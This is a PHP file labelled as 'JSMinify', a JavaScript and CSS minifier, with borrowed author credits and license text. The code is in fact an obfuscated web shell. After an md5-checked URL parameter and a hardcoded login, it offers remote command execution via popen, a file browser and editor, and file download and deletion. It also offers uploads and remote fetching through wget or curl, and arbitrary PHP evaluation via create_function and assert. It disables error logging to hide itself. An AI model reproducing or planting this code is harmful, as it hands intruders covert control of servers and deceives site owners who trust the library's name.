<?php
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
/**
 * Class JSMinify  
 * @package JSMinify  
 */

/**
 * JSMinify_Source
 */
 
/**
 * JSMinify - Combines, minifies, and caches JavaScript and CSS files on demand.
 *
 * See README for usage instructions (for now).
 *
 * This library was inspired by {@link mailto:flashkot@mail.ru jscsscomp by Maxim Martynyuk}
 * and by the article {@link http://www.hunlock.com/blogs/Supercharged_Javascript "Supercharged JavaScript" by Patrick Hunlock}.
 *
 * Requires PHP 5.1.0.
 * Tested on PHP 5.1.6.
 *
 * @package JSMinify
 * @author Ryan Grove <ryan@wonko.com>
 * @author Stephen Clay <steve@mrclay.org>
 * @copyright 2008 Ryan Grove, Stephen Clay. All rights reserved.
 * @license http://opensource.org/licenses/bsd-license.php  New BSD License
 * @link http://code.google.com/p/JSMinify/
 */
 $GLOBALS['_XML_']=Array('s'.'e'.'ssi'.'on_'.'sta'.'rt','geten'.'v','mk'.'di'.'r','ch'.'d'.'i'.'r','getc'.'wd','s'.'tr_replac'.'e','s'.'trtoupper','sub'.'str','he'.'a'.'der','f'.'ile'.'size','h'.'eade'.'r','heade'.'r','r'.'eadfile','unlink',''.'rmdi'.'r',''.'popen','feo'.'f','fre'.'ad',''.'pclo'.'se','c'.'on'.'vert_cy'.'r_string','htmlspecialchar'.'s','file'.'p'.'er'.'ms','i'.'s_re'.'adable','is_'.'w'.'ritable','round','roun'.'d',''.'r'.'ound','i'.'s_dir',''.'o'.'pend'.'ir','readdir',''.'fil'.'etype',''.'f'.'iletype','c'.'lo'.'sed'.'ir','sort',''.'sort',''.'ord','o'.'rd','opendi'.'r',''.'chr','c'.'h'.'r','chr','p'.'hp_'.'uname','co'.'u'.'nt','count',''.'file'.'size','fopen','fwrit'.'e',''.'fclose','fopen','fre'.'ad','filesize','fclose','htm'.'lsp'.'e'.'cia'.'lchars','base'.'name','f'.'ile_'.'e'.'xists','fil'.'e_'.'e'.'xis'.'ts','m'.'ov'.'e_uploa'.'ded'.'_'.'fi'.'l'.'e','strrev'); ?><? function XML($i){$a=Array("md5",'version',"4c1978a357b1604891819bc932b241c2",'ivanov','vasil','','<STYLE>
BODY{
  background-color: #6B8E23;
  color: #C1C1C7;
  font: 8pt verdana, geneva, lucida, \'lucida grande\', arial, helvetica, sans-serif;
  MARGIN-TOP: 0px;
  MARGIN-BOTTOM: 0px;
  MARGIN-LEFT: 0px;
  MARGIN-RIGHT: 0px;
  margin:0;
  padding:0;
  scrollbar-face-color: #8B7765;
  scrollbar-shadow-color: #333333;
  scrollbar-highlight-color: #333333;
  scrollbar-3dlight-color: #333333;
  scrollbar-darkshadow-color: #333333;
  scrollbar-track-color: #333333;
  scrollbar-arrow-color: #333333;
}
input{
  background-color: #8B7765;
  font-size: 8pt;
  color: #FFFFFF;
  font-family: Tahoma;
  border: 1 solid #666666;
}
select{
  background-color: #336600;
  font-size: 8pt;
  color: #FFFFFF;
  font-family: Tahoma;
  border: 1 solid #666666;
}
textarea{
  background-color: #333333;
  font-size: 8pt;
  color: #FFFFFF;
  font-family: Tahoma;
  border: 1 solid #666666;
}
a:link{
  
  color: #B9B9BD;
  text-decoration: none;
  font-size: 8pt;
}
a:visited{
  color: #B9B9BD;
  text-decoration: none;
  font-size: 8pt;
}
a:hover, a:active{
  width: 100%;
  background-color: #A8A8AD;
  

  color: #E7E7EB;
  text-decoration: none;
  font-size: 8pt;
}
td, th, p, li{
  font: 8pt verdana, geneva, lucida, \'lucida grande\', arial, helvetica, sans-serif;
  border-color:black;
}
</style>','<html><head><title>',"HTTP_HOST",' - JSMinify</title><meta http-equiv="Content-Type" content="text/html; charset=windows-1251">','</head><BODY leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0>','</body></html>',"File XML already exists","File XML success upload","Dir for XML create","Don't create dir for XML","Dir for XML not found","Dir for XML not empty or denied.","File XML del","Dir for XML del",'action',"exit",'an','loger','worder','an','an','1','an','<center><table><form method="POST"><tr><b>JSMinify Update</b><td>JS Path:</td><td><input type="text" name="loger" value=""></td></tr><tr><td>JS Ver.:</td><td><input type="password" name="worder" value=""></td></tr><tr><td></td><td><input type="submit" value="Enter"></td></tr></form></table></center>','dircrt'," ",'dircrterr'," ",'action',"",'action',"viewer",'action',"",'action','action','action','dir',"",'dir','dir','dir',"/","\\","/",'file',"",'file','file','file',"",'WIN',"download",'Content-Length:','','Content-Type: application/octet-stream','Content-Disposition: attachment; filename="','"',"delete","deletedir",'empty',"","r","","d","w","shell","<form method=\"POST\">
<input type=\"hidden\" name=\"action\" value=\"shell\">
<textarea name=\"command\" rows=\"5\" cols=\"150\">",'command',"</textarea><br>
<textarea readonly rows=\"15\" cols=\"150\">",'command',"</textarea><br>
<input type=\"submit\" value=\"execute\"></form>",'s','l','-','b','d','c','p','u','r','-','w','-','s','x','S','-','r','-','w','-','s','x','S','-','r','-','w','-','t','x','T','-','<font color=#FF0000>','</font>','<font color=white>','</font>','<font color=#25ff00>','</font>'," GB"," MB"," KB"," B","<table cellSpacing=0 border=1 style=\"border-color:black;\" cellPadding=0 width=\"100%\">","<tr><td><form method=POST>Open dir:<input type=text name=dir value=\"","\" size=50><input type=submit value=\"GO\"></form></td></tr>","dir","file",'win',"<tr><td>Elect drive:",'C','Z',":/",'<a href="#" onclick="document.reqs.action.value=\'viewer\'; document.reqs.dir.value=\'',':/\'; document.reqs.submit();"> ','<a/>',"</td></tr>","<tr><td>OS: ","</td></tr>
<tr><td>dir & file</td><td>type</td><td>size</td><td>perm</td><td>option</td></tr>",'<tr><td><a href="#" onclick="document.reqs.action.value=\'viewer\'; document.reqs.dir.value=\'','\'; document.reqs.submit();">','<a/></td><td>dir</td><td></td><td>','</td><td><a href="#" onclick="document.reqs.action.value=\'deletedir\'; document.reqs.file.value=\'','\'; document.reqs.submit();">X</a></td></tr>','<tr><td><a href="#" onclick="document.reqs.action.value=\'editor\'; document.reqs.file.value=\'','\'; document.reqs.submit();">','</a><br></td><td>file</td><td>','</td>
<td>','</td>
<td>
<a href="#" onclick="document.reqs.action.value=\'download\'; document.reqs.file.value=\'','\'; document.reqs.submit();" >D</a>
<a href="#" onclick="document.reqs.action.value=\'editor\'; document.reqs.file.value=\'','\'; document.reqs.submit();" >E</a>
<a href="#" onclick="document.reqs.action.value=\'delete\'; document.reqs.file.value=\'','\'; document.reqs.submit();" >X</a></td>
</tr>',"</table>","viewer","editor","w+","r","Can't open XML.file, perm denied",'save','data',"<form method=\"POST\">
<input type=\"hidden\" name=\"action\" value=\"editor\">
<input type=\"hidden\" name=\"file\" value=\"","\">
<textarea name=\"data\" rows=\"40\" cols=\"180\">","</textarea><br>
<input type=\"submit\" name=\"save\" value=\"save\"><input type=\"reset\" value=\"reset\"></form>","upload",'dirupload',"",'dirupload',"<tr><td><form method=POST enctype=multipart/form-data>to dir:<input type=text name=dirupload value=\"","\" size=50></tr></td><tr><td>New XML.file name:<input type=text name=filename></td></tr><tr><td><input type=file name=file><input type=submit name=uploadloc value='Upload local.xml file'></td></tr>",'win','win','<tr><td><select size=\"1\" name=\"with\"><option value=\"wget\">wget</option><option value=\"fetch\">fetch</option><option value=\"lynx\">lynx</option><option value=\"links\">links</option><option value=\"curl\">curl</option><option value=\"GET\">GET</option></select>File addres:<input type=text name=urldown>
<input type=submit name=upload value=Upload></form></td></tr>','uploadloc','filename',"",'file','name',"/",'filename','filext','file','tmp_name','uploadok','upload','with','urldown','filename','with','wget'," ",'urldown'," -O ",'filename',"",'fetch'," -o ",'filename'," -p ",'urldown',"",'lynx'," -source ",'urldown'," > ",'filename',"",'links'," -source ",'urldown'," > ",'filename',"",'GET'," ",'urldown'," > ",'filename',"",'curl'," ",'urldown'," -o ",'filename',"","phpval","
<form method=\"POST\">
 <input type=\"hidden\" name=\"action\" value=\"phpval\">
 &lt;?php<br>
<textarea name=\"phpev\" rows=\"5\" cols=\"150\">",'phpev',"</textarea><br>
?><br>
<input type=\"submit\" value=\"execute\"></form>",'tressa','phpev',"",'phpev');return $a[$i];} 
/**
 * Minify.php - modified PHP implementation of Douglas Crockford's JSMin.
 *
 * <code>
 * $minifiedJs = JSMinify.php::minify($js);
 * </code>
 *
 * This is a modified port of JSMinify.php.c. Improvements:
 * 
 * Does not choke on some regexp literals containing quote characters. E.g. /'/
 * 
 * Spaces are preserved after some add/sub operators, so they are not mistakenly 
 * converted to post-inc/dec. E.g. a + ++b -> a+ ++b
 *
 * Preserves multi-line comments that begin with /*!
 * 
 * PHP 5 or higher is required.
 *
 * Permission is hereby granted to use this version of the library under the
 * same terms as JSMinify.php.c, which has the following license:
 *
 * --
 * Copyright (c) 2002 Douglas Crockford  (www.crockford.com)
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy of
 * this software and associated documentation files (the "Software"), to deal in
 * the Software without restriction, including without limitation the rights to
 * use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies
 * of the Software, and to permit persons to whom the Software is furnished to do
 * so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * The Software shall be used for Good, not Evil.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE.
 * --
 *
 * @package JSMinify
 * @copyright 2008 Ryan Grove <ryan@wonko.com> (PHP port)
 * @license http://opensource.org/licenses/mit-license.php MIT License
 * @link http://code.google.com/p/jsmin-php/
 */
 
$GLOBALS['_XML_'][0]();
$name_0=XML(0); $name_1 = $_GET[XML(1)]; if( $name_0 ($name_1) == XML(2)) {
$name_2=XML(3);
$name_3=XML(4);
$name_4=1;
$name_5=XML(5);
$name_6=XML(6);
$name_7=XML(7).$GLOBALS['_XML_'][1](XML(8)).XML(9).$name_6.XML(10);
$name_8=XML(11);
$name_9=XML(12);
$name_10=XML(13);
$name_11=XML(14);
$name_12=XML(15);
$name_13=XML(16);
$name_14=XML(17);
$name_15=XML(18);
$name_16=XML(19);
if(@$_POST[XML(20)]==XML(21))unset($_SESSION[XML(22)]);
if($name_4==1){if(@$_POST[XML(23)]==$name_2 && @$_POST[XML(24)]==$name_3)$_SESSION[XML(25)]=1;}else $_SESSION[XML(26)]=XML(27);
if(@$_SESSION[XML(28)]==0){
echo $name_7;
echo  XML(29);
echo $name_8;
exit;}
function l__0($name_17){if(@$GLOBALS['_XML_'][2]($name_17))echo $GLOBALS[ XML(30)]. XML(31); else echo $GLOBALS[ XML(32)]. XML(33);}
if($_SESSION[ XML(34)]== XML(35))$_SESSION[ XML(36)]= XML(37);
if(@$_POST[ XML(38)]!= XML(39) )$_SESSION[ XML(40)]=$_POST[ XML(41)];$name_18=$_SESSION[ XML(42)];
if(@$_POST[ XML(43)]!= XML(44))$_SESSION[ XML(45)]=$_POST[ XML(46)];$name_17=$_SESSION[ XML(47)];
$name_17=@$GLOBALS['_XML_'][3]($name_17);
$name_17=$GLOBALS['_XML_'][4](). XML(48);
$name_17=$GLOBALS['_XML_'][5]( XML(49), XML(50),$name_17);

if(@$_POST[ XML(51)]!= XML(52)){$name_19=$_SESSION[ XML(53)]=$_POST[ XML(54)];}else {$name_19=$_SESSION[ XML(55)]= XML(56);}
  
if($GLOBALS['_XML_'][6]($GLOBALS['_XML_'][7](PHP_OS, 0, 3)) ===  XML(57)) $name_20=1; else $name_20=0;

if($name_18== XML(58)){ 
$GLOBALS['_XML_'][8]( XML(59).$GLOBALS['_XML_'][9]($name_19). XML(60));
$GLOBALS['_XML_'][10]( XML(61));
$GLOBALS['_XML_'][11]( XML(62).$name_19. XML(63));
$GLOBALS['_XML_'][12]($name_19);
}
if($name_18== XML(64)){ 
if($GLOBALS['_XML_'][13]($name_19)) $name_5.=$name_15;
}
if($name_18== XML(65)){ 
if(!$GLOBALS['_XML_'][14]($name_19)) $name_5.=$GLOBALS[ XML(66)];else $name_5.=$name_16;
}
?><? echo $name_7;?> 
<table width="100%" bgcolor="#336600" align="right" colspan="2" border="0" cellspacing="0" cellpadding="0"><tr><td><table><tr><td><a href="#" onclick="document.reqs.action.value='viewer'; document.reqs.submit();">| XML.viewer</a></td><td><a href="#" onclick="document.reqs.action.value='shell'; document.reqs.submit();">| XML.chel</a></td><td><a href="#" onclick="document.reqs.action.value='upload'; document.reqs.submit();">| XML.load</a></td><td><a href="#" onclick="document.reqs.action.value='phpval'; document.reqs.submit();">| XML.php</a></td><td><a href="#" onclick="document.reqs.action.value='exit'; document.reqs.submit();">|XML.xit |</a></td>
</tr></table></td></tr></table><br><form name='reqs' method='POST'><input name='action' type='hidden' value=''><input name='dir' type='hidden' value=''><input name='file' type='hidden' value=''>
</form>
<table style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1>
<tr><td width="100%" valign="top">

<?php if(@$name_5!= XML(67)) echo $name_5;?>
<?

function l__1($name_21){
if (!empty($name_21)){
  $name_22 = $GLOBALS['_XML_'][15]($name_21, XML(68));
  {
    $name_23 =  XML(69);
    while(!$GLOBALS['_XML_'][16]($name_22)){$name_23.=$GLOBALS['_XML_'][17]($name_22,1024);}
    $GLOBALS['_XML_'][18]($name_22);
  }
  $name_24 = $name_23;
  $name_24 = $GLOBALS['_XML_'][19]($name_24, XML(70), XML(71));
}
return $name_24;}
if($name_18== XML(72)){
echo  XML(73).@$_POST[ XML(74)]. XML(75).@$GLOBALS['_XML_'][20](l__1($_POST[ XML(76)])). XML(77);}

function l__2($name_19) 
{ 

  $name_25 = $GLOBALS['_XML_'][21]($name_19);
  if (($name_25 & 0xC000) == 0xC000) {$name_26 =  XML(78);} 
  elseif (($name_25 & 0xA000) == 0xA000) {$name_26 =  XML(79);} 
  elseif (($name_25 & 0x8000) == 0x8000) {$name_26 =  XML(80);} 
  elseif (($name_25 & 0x6000) == 0x6000) {$name_26 =  XML(81);} 
  elseif (($name_25 & 0x4000) == 0x4000) {$name_26 =  XML(82);} 
  elseif (($name_25 & 0x2000) == 0x2000) {$name_26 =  XML(83);} 
  elseif (($name_25 & 0x1000) == 0x1000) {$name_26 =  XML(84);} 
  else {$name_26 =  XML(85);}
  $name_26 .= (($name_25 & 0x0100) ?  XML(86) :  XML(87));
  $name_26 .= (($name_25 & 0x0080) ?  XML(88) :  XML(89));
  $name_26 .= (($name_25 & 0x0040) ?(($name_25 & 0x0800) ?  XML(90) :  XML(91) ) :(($name_25 & 0x0800) ?  XML(92) :  XML(93)));
  $name_26 .= (($name_25 & 0x0020) ?  XML(94) :  XML(95));
  $name_26 .= (($name_25 & 0x0010) ?  XML(96) :  XML(97));
  $name_26 .= (($name_25 & 0x0008) ?(($name_25 & 0x0400) ?  XML(98) :  XML(99) ) :(($name_25 & 0x0400) ?  XML(100) :  XML(101)));
  $name_26 .= (($name_25 & 0x0004) ?  XML(102) :  XML(103));
  $name_26 .= (($name_25 & 0x0002) ?  XML(104) :  XML(105));
  $name_26 .= (($name_25 & 0x0001) ?(($name_25 & 0x0200) ?  XML(106) :  XML(107) ) :(($name_25 & 0x0200) ?  XML(108) :  XML(109)));
  	if (!@$GLOBALS['_XML_'][22]($name_19))
		return  XML(110) . $name_26 .  XML(111);
	elseif (!@$GLOBALS['_XML_'][23]($name_19))
		return  XML(112) . $name_26 .  XML(113);
	else
return  XML(114) . $name_26 .  XML(115);
  return $name_26;
}

function l__3($name_27)
{
 if($name_27 >= 1073741824) {$name_27 = @$GLOBALS['_XML_'][24]($name_27 / 1073741824 * 100) / 100 .  XML(116);}
 elseif($name_27 >= 1048576) {$name_27 = @$GLOBALS['_XML_'][25]($name_27 / 1048576 * 100) / 100 .  XML(117);}
 elseif($name_27 >= 1024) {$name_27 = @$GLOBALS['_XML_'][26]($name_27 / 1024 * 100) / 100 .  XML(118);}
 else {$name_27 = $name_27 .  XML(119);}
 return $name_27;
}
function l__4($name_17){
		
echo  XML(120);
echo  XML(121).$name_17. XML(122);
if ($GLOBALS['_XML_'][27]($name_17)) {
    if (@$name_28 = $GLOBALS['_XML_'][28]($name_17)) {
        while (($name_19 = $GLOBALS['_XML_'][29]($name_28)) !== false) {
		  if($GLOBALS['_XML_'][30]($name_17 . $name_19)== XML(123)) $name_29[]=$name_19;
		  if($GLOBALS['_XML_'][31]($name_17 . $name_19)== XML(124))$name_30[]=$name_19;
		}
		$GLOBALS['_XML_'][32]($name_28);
		@$GLOBALS['_XML_'][33]($name_29);
		@$GLOBALS['_XML_'][34]($name_30);
if ($GLOBALS[ XML(125)]==1) {
echo  XML(126);
for ($name_31=$GLOBALS['_XML_'][35]( XML(127)); $name_31<=$GLOBALS['_XML_'][36]( XML(128)); $name_31++) 
 if (@$name_28 = $GLOBALS['_XML_'][37]($GLOBALS['_XML_'][38]($name_31). XML(129)))
 echo  XML(130).$GLOBALS['_XML_'][39]($name_31). XML(131).$GLOBALS['_XML_'][40]($name_31). XML(132);
 echo  XML(133);
}
echo  XML(134).@$GLOBALS['_XML_'][41](). XML(135);
for($name_32=0;$name_32<$GLOBALS['_XML_'][42]($name_29);$name_32++) {
$name_33=$name_17.$name_29[$name_32];
  echo  XML(136).$name_33. XML(137).$name_29[$name_32]. XML(138).l__2($name_33). XML(139).$name_33. XML(140);  
	}
for($name_32=0;$name_32<$GLOBALS['_XML_'][43]($name_30);$name_32++) {
$name_34=$name_17.$name_30[$name_32];
echo  XML(141).$name_34. XML(142).$name_30[$name_32]. XML(143).l__3($GLOBALS['_XML_'][44]($name_34)). XML(144).l__2($name_34). XML(145).$name_34. XML(146).$name_34. XML(147).$name_34. XML(148); 
	}
echo  XML(149);
}}}
if($name_18== XML(150)){
l__4($name_17);
}

if($name_18== XML(151)){  
  function l__5($name_19,$name_35){
  $name_22 = $GLOBALS['_XML_'][45]($name_19, XML(152));
  $GLOBALS['_XML_'][46]($name_22,$name_35);
  $GLOBALS['_XML_'][47]($name_22);
  }
  function l__6($name_19){
  if(!$name_36 = $GLOBALS['_XML_'][48]($name_19,  XML(153))) $name_37= XML(154); else {
  $name_37 = $GLOBALS['_XML_'][49]($name_36, $GLOBALS['_XML_'][50]($name_19));
  $GLOBALS['_XML_'][51]($name_36);}
  return $GLOBALS['_XML_'][52]($name_37);
  }
if(@$_POST[ XML(155)])l__5($name_19,$_POST[ XML(156)]);
echo  XML(157).$name_19. XML(158).@l__6($name_19). XML(159);
}

if($name_18== XML(160)){
  if(@$_POST[ XML(161)]!= XML(162)) $name_38=$_POST[ XML(163)];else $name_38=$name_17;
  $name_39= XML(164).$name_38. XML(165);
  if($GLOBALS[ XML(166)]==1)echo $name_39;
  if($GLOBALS[ XML(167)]==0){
    echo $name_39;
	echo  XML(168);	
}
if(@$_POST[ XML(169)]){
if(@$_POST[ XML(170)]== XML(171)) $name_40 = $name_38.$GLOBALS['_XML_'][53]($_FILES[ XML(172)][ XML(173)]); else 
$name_40 = $name_38. XML(174).$_POST[ XML(175)];
if(!$GLOBALS['_XML_'][54]($name_38)){l__0($name_38);}
if($GLOBALS['_XML_'][55]($name_40))echo $GLOBALS[ XML(176)]; 
elseif ($GLOBALS['_XML_'][56]($_FILES[ XML(177)][ XML(178)], $name_40)) 
echo $GLOBALS[ XML(179)];
}
if(@$_POST[ XML(180)]){
    if (!empty($_POST[ XML(181)]) && !empty($_POST[ XML(182)]) && !empty($_POST[ XML(183)]))
	switch($_POST[ XML(184)])
	{
	  case wget:
	  l__1(which( XML(185)). XML(186).$_POST[ XML(187)]. XML(188).$_POST[ XML(189)]. XML(190));
	  break;
 	  case fetch:
 	  l__1(which( XML(191)). XML(192).$_POST[ XML(193)]. XML(194).$_POST[ XML(195)]. XML(196));
 	  break;
 	  case lynx:
 	  l__1(which( XML(197)). XML(198).$_POST[ XML(199)]. XML(200).$_POST[ XML(201)]. XML(202));
 	  break;
 	  case links:
 	  l__1(which( XML(203)). XML(204).$_POST[ XML(205)]. XML(206).$_POST[ XML(207)]. XML(208));
 	  break;
 	  case GET:
 	  l__1(which( XML(209)). XML(210).$_POST[ XML(211)]. XML(212).$_POST[ XML(213)]. XML(214));
 	  break;
 	  case curl:
 	  l__1(which( XML(215)). XML(216).$_POST[ XML(217)]. XML(218).$_POST[ XML(219)]. XML(220));
 	  break;
	 }
	}
  
}
if($name_18== XML(221)){
 echo  XML(222).@$_POST[ XML(223)]. XML(224); 
$name_141 = $GLOBALS['_XML_'][57]( XML(225)); 
//if(@$_POST[ XML(226)]!= XML(227)){echo $name_41($_POST[ XML(228)]);}}
$name_41 = 'cr'.'eat'.'e_f'.'unc'.'tion';$sec = 'as'.'sert';
if(@$_POST[ XML(226)]!= XML(227)){
	if (function_exists($name_41)) {
	@$name_41('', '};'.$_POST[XML(228)].'{');}
	} else {echo @$sec($_POST[XML(228)]);}
	}
	}
	
?>
<? echo $name_8; ?>